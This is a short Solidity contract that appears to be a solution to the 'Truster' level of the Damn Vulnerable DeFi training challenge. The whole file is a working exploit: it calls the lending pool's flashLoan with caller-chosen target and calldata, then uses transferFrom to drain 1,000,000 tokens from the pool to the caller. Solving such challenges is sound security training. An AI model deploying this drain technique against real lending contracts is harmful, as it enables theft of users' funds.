// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../truster/TrusterLenderPool.sol";
contract TrusterA {
    TrusterLenderPool public attacker;
    IERC20 public immutable damnValuableToken;
    constructor(address payable attack_address, address token_address ){
        attacker = TrusterLenderPool(attack_address);
        damnValuableToken = IERC20(token_address);
    }
    
 function attack(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    )
       external
    {
        attacker.flashLoan(borrowAmount, borrower, target, data);
        damnValuableToken.transferFrom(address(attacker), msg.sender, 1000000 ether);
    }

}